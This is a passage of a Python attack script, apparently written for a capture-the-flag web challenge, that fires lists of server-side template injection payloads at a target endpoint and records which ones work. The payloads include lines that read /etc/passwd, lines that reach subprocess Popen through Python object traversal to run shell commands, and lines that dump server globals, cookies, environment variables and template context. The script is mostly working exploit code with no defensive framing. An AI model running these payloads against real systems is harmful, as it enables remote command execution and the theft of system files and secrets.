        "{{ '..'~'/etc'~'/passwd' }}",
    ],
    
    "Object Traversal for Popen": [
        "{{ ''.__class__.__mro__[2].__subclasses__() }}",
        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
        "{{ ''.__class__.__mro__[2].__subclasses__()[258]('id', shell=True, stdout=-1).communicate() }}",
        "{% set classes = ''.__class__.__mro__[2].__subclasses__() %}{{ classes }}",
        "{% for cls in ''.__class__.__mro__[2].__subclasses__() %}{% if 'Popen' in cls.__name__ %}{{ cls }}{% endif %}{% endfor %}",
        "{{ ().__class__.__bases__[0].__subclasses__() }}",
        "{{ request.__class__.__mro__[1].__subclasses__() }}",
    ],
    
    "Global Variables & Constants": [
        "{{ constant('PHP_VERSION') }}",
        "{{ constant('PHP_CONFIG_FILE_PATH') }}",
        "{{ constant('PHP_BINDIR') }}",
        "{{ constant('DIRECTORY_SEPARATOR') }}",
        "{{ constant('FILE_APPEND') }}",
        "{{ _SERVER }}",
        "{{ _GET }}",
        "{{ _POST }}",
        "{{ _COOKIE }}",
        "{{ _FILES }}",
        "{{ _ENV }}",
    ],
    
    "Advanced Dumping": [
        "{{ dump(_context) ~ dump(_self.env) }}",
        "{% for key, value in _context %}{{ key }}: {{ value|default('null') }},{% endfor %}",
        "{% for key, value in _self.vars %}{{ key }}: {{ value }},{% endfor %}",
        "{{ _self.env.getFunctions() }}",
        "{{ _self.env.getFilters() }}",
        "{{ _self.env.getTests() }}",
        "{{ _self.env.getGlobals() }}",
    ],
}

# Track results
results = {}
successful_payloads = []
failed_payloads = []
interesting_responses = []

# Test each category
for category, payloads in test_categories.items():
    print(f"\n{YELLOW}[*] Testing: {category}{RESET}")
    print(f"{YELLOW}{'='*60}{RESET}")
    
    category_results = []
    
    for payload in payloads:
        try:
            # Prepare POST data
            data = {'name': payload}
            
            # Send request
            response = session.post(f"{base_url}{target_endpoint}", data=data, timeout=10)
            
            # Analyze response
            response_text = response.text
            status_code = response.status_code
            
            # Look for interesting patterns
            interesting = False
            has_data = False
            error = False
            
            # Check for error indicators
            error_indicators = ['Error', 'error', 'Exception', 'Fatal', 'Warning', 'Twig\\Error']
            if any(indicator in response_text for indicator in error_indicators):
                error = True
            
            # Check for successful indicators
            success_indicators = ['Array', 'array', 'object', 'class', 'string', 'int', 'float', 'bool']
            data_indicators = ['title', 'name', 'id', 'article', 'content', 'post', 'blog', 'published']
            
            if any(indicator in response_text for indicator in success_indicators):
                has_data = True
                interesting = True
            
            if any(indicator in response_text.lower() for indicator in data_indicators):
                has_data = True
                interesting = True
            
            # Check for flag pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', response_text)
            if flag_match:
                print(f"\n{GREEN}[!] FLAG FOUND: {flag_match.group(0)}{RESET}")
                interesting = True
            
            # Check if payload executed (not showing as literal)
            if payload not in response_text and status_code == 200:
                interesting = True
            
            # Record result
            result = {
                'payload': payload,
                'status': status_code,
                'length': len(response_text),
                'interesting': interesting,
                'has_data': has_data,
                'error': error,
                'sample': response_text[:200] if len(response_text) > 200 else response_text
            }
            
            category_results.append(result)
            
            # Print result
            if interesting:
                print(f"{GREEN}[+] SUCCESS{RESET} | Status: {status_code} | Length: {len(response_text)}")
                print(f"    Payload: {payload[:80]}")
                successful_payloads.append(payload)
                if len(response_text) > 0:
                    print(f"    Sample: {response_text[:150]}...")
                interesting_responses.append({
                    'payload': payload,
                    'response': response_text,
                    'status': status_code
                })
            else:
                print(f"{RED}[-] Failed{RESET}   | Status: {status_code} | Length: {len(response_text)}")
                failed_payloads.append(payload)
            
        except Exception as e:
            print(f"{RED}[!] Error with payload {payload[:50]}: {str(e)}{RESET}")
            category_results.append({
                'payload': payload,
                'error': str(e)
            })
    
    results[category] = category_results

# Summary
print(f"\n\n{YELLOW}[*] SUMMARY{RESET}")
print(f"{YELLOW}{'='*60}{RESET}")
print(f"Total Categories Tested: {len(test_categories)}")
print(f"Total Payloads Tested: {sum(len(p) for p in test_categories.values())}")
print(f"Successful Payloads: {len(successful_payloads)}")
print(f"Failed Payloads: {len(failed_payloads)}")
print(f"Interesting Responses: {len(interesting_responses)}")

# Save detailed results
with open('/tmp/twig_ssti_results.json', 'w') as f:
    json.dump({
        'results': results,
        'successful_payloads': successful_payloads,
        'interesting_responses': interesting_responses
    }, f, indent=2, default=str)

print(f"\n[*] Detailed results saved to /tmp/twig_ssti_results.json")

# Display interesting payloads that revealed data structures
if interesting_responses:
    print(f"\n{GREEN}[*] MOST PROMISING PAYLOADS FOR ARTICLE ENUMERATION:{RESET}")
    for i, resp in enumerate(interesting_responses[:10], 1):
        print(f"\n{i}. Payload: {resp['payload']}")
        print(f"   Status: {resp['status']} | Length: {len(resp['response'])}")
        print(f"   Response: {resp['response'][:200]}...")

print(f"\n{YELLOW}[*] Testing complete!{RESET}")
